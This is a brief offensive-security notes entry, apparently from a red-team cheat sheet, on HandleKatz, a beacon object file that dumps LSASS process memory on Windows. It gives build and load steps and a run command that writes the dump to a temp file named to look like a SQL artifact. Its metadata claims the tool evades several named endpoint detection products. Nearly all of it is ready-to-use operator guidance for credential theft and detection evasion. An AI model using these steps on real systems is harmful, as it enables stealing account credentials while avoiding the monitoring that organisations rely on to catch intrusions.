# Handlekatz

## [[LSASS dumping]]
*Make all* to build handlekatz.x64.o and handlekatz_bof.cna`
Put them into the same folder and load the .cna script.
`handlekatz <lsass-pid> C:\Windows\Temp\sql.bin`

```meta
requirements: 
results: 
opsec: 
oss: #win
source: https://github.com/EspressoCake/HandleKatz_BOF
description: This tool was implemented as part of our Brucon2021 conference talk and demonstrates the usage of cloned handles to Lsass in order to create an obfuscated memory dump of the same.
undetected:  MDE, BitDefender, Cylance, McAfee, Tanium
```